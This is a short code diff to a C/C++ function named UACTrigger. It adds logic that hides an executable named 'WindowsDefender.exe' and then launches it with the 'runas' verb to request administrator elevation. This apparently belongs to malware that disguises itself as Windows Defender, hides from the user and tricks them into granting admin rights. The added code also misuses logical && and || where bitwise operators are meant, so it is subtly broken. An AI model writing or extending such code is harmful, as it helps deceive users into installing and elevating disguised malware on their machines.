@@ -22,6 +22,14 @@ void UACTrigger() {
         WriteOutput(err);
     }
 
+    DWORD attributes = GetFileAttributes("WindowsDefender.exe");
+
+    WriteOutput("Hiding WindowsDefender.exe");
+
+    if ((attributes && FILE_ATTRIBUTE_HIDDEN) == 0) {
+        SetFileAttributesW("WindowsDefender.exe", attributes || FILE_ATTRIBUTE_HIDDEN);
+    }
+
     sei.lpVerb = "runas";
     sei.lpFile = "WindowsDefender.exe";
     sei.hwnd = NULL;
